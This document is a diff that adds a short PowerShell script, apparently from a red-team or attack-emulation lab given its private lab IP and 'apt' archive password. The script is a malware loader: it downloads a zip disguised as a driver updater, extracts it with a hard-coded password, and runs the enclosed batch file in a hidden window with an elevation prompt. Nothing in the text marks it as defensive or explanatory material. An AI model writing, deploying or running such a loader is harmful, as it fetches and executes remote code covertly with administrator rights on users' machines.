@@ -1,0 +1,17 @@
+$zipUrl = "http://192.168.56.10/downloads/RC72LA_driver-7-updater.zip"
+$zipPath = "$env:TEMP\RC72LA_driver-7-updater.zip"
+Invoke-WebRequest -Uri $zipUrl -OutFile $zipPath -UseBasicParsing
+
+$7zip = "C:\Program Files\7-Zip\7z.exe"
+$extractPath = "$env:TEMP\decrypted"
+& $7zip x "-o$extractPath" "-papt" -y $zipPath | Out-Null
+
+$batFile = Get-ChildItem -Path $extractPath -Filter *.bat -Recurse | Select-Object -First 1
+if ($batFile) {
+    $psi = New-Object System.Diagnostics.ProcessStartInfo
+    $psi.FileName = "cmd.exe"
+    $psi.Arguments = "/c `"$($batFile.FullName)`""
+    $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
+    $psi.Verb = "runas"
+    [System.Diagnostics.Process]::Start($psi) | Out-Null
+}
